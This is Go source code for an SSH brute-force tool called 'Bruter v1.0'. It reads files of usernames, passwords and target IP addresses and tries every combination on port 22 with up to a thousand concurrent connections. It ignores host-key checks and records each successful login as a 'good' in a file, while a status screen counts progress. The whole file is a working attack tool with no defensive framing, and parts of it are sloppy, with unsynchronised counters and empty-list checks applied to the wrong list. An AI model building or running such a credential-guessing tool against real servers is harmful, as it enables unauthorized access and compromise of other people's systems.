package main

import (
	"fmt"
	"os"
	"sync"
	"time"

	"de1v.eu/bruter/files"
	"de1v.eu/bruter/terminal"
	"golang.org/x/crypto/ssh"
)

var usernamesFile string = "usernames.txt"
var passwordsFile string = "passwords.txt"
var ipsFile string = "ips.txt"
var timeout int = 5
var numConcurrents int = 1000

var checkedSSH int = 0
var connected int = 0
var goodsFinded int = 0

func loginSSH(username, password, ip string, channel chan struct{}, wg *sync.WaitGroup, mtx *sync.Mutex) {
	defer wg.Done()

	channel <- struct{}{}
	defer func() { <-channel }()

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}

	conn, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		checkedSSH++
		connected++
		return
	}
	conn.Close()

	checkedSSH++
	connected++
	goodsFinded++

	connectStr := fmt.Sprintf("%s:22 %s:%s", ip, username, password)

	mtx.Lock()
	files.SaveStringToFile(connectStr)
	mtx.Unlock()
}

func startBruter(usernames, passwords, ips []string) {
	var wg sync.WaitGroup
	var mtx sync.Mutex
	channel := make(chan struct{}, numConcurrents)

	for _, ip := range ips {
		for _, username := range usernames {
			for _, password := range passwords {
				wg.Add(1)
				go loginSSH(username, password, ip, channel, &wg, &mtx)
				time.Sleep(time.Millisecond)
			}
		}
	}

	wg.Wait()
	close(channel)
}

func main() {
	banner := `
	+--------------------------------------------------------------------------------+
	| Bruter v1.0 - A brute force SSH.                              	     	     |
	| Author: de1v (https://github.com/mrde1v/bruter)                                |
	| Usage: ./bruter                                                                |
	+--------------------------------------------------------------------------------+
`
	fmt.Println(banner)

	time.Sleep(300 * time.Millisecond)

	fmt.Printf("Enter usernames file (usernames.txt): ")
	fmt.Scan(&usernamesFile)
	fmt.Printf("Enter passwords file (passwords.txt): ")
	fmt.Scan(&passwordsFile)
	fmt.Printf("Enter ips file (ips.txt): ")
	fmt.Scan(&ipsFile)
	fmt.Printf("Enter timeout (5): ")
	fmt.Scan(&timeout)
	fmt.Printf("Enter numConcurrents (1000): ")
	fmt.Scan(&numConcurrents)
	fmt.Println("Starting bruter...")

	start := time.Now()

	ips := files.ReadIPsFile(ipsFile)
	if len(ips) == 0 {
		terminal.Print("No IPs found in file.")
		return
	}
	usernames := files.ReadIPsFile(usernamesFile)
	if len(ips) == 0 {
		terminal.Print("No usernames found in file.")
		return
	}
	passwords := files.ReadIPsFile(passwordsFile)
	if len(ips) == 0 {
		terminal.Print("No passwords found in file.")
		return
	}

	checksSSH := len(ips) * len(usernames) * len(passwords)

	go startBruter(usernames, passwords, ips)

	go func() {
		remainingTimeStart := time.Now().Add(time.Duration(checksSSH/numConcurrents*timeout) * time.Second)
		for {
			elapsed := time.Since(start)
			totalSeconds := int(elapsed.Seconds())

			days := totalSeconds / (24 * 3600)
			totalSeconds %= 24 * 3600
			hours := totalSeconds / 3600
			totalSeconds %= 3600
			minutes := totalSeconds / 60
			seconds := totalSeconds % 60

			elapsedTime := fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, seconds)

			totalSecondsR := int(time.Until(remainingTimeStart).Seconds())

			if totalSecondsR < 0 {
				totalSecondsR = 0
			}

			connectedChecked := false
			if !connectedChecked {
				connectedChecked = true
				connected = 0
			} else {
				connectedChecked = false
			}

			terminal.ClearTerminal()

			statusRaw := fmt.Sprintf(
				"+---------------------------------+\n"+
					"File: %s | Timeout: %ds\n"+
					"|---------------------------------|\n"+
					"Checked SSH: %d/%d\n"+
					"Connected: %d IP/s\n"+
					"Elapsed Time: %s\n"+
					"Remaining Time: %d seconds\n"+
					"Goods: %d\n"+
					"+---------------------------------+\n"+
					"|      coded by de1v with ♥       |\n"+
					"+---------------------------------+\n",
				ipsFile, timeout, checkedSSH, checksSSH, connected, elapsedTime, totalSecondsR, goodsFinded,
			)

			terminal.Print(statusRaw)

			if checkedSSH == checksSSH {
				terminal.Print("Finished brute forcing. Goods found: " + fmt.Sprint(goodsFinded))
				os.Exit(0)
			}
			time.Sleep(500 * time.Millisecond)
		}
	}()

	select {}
}
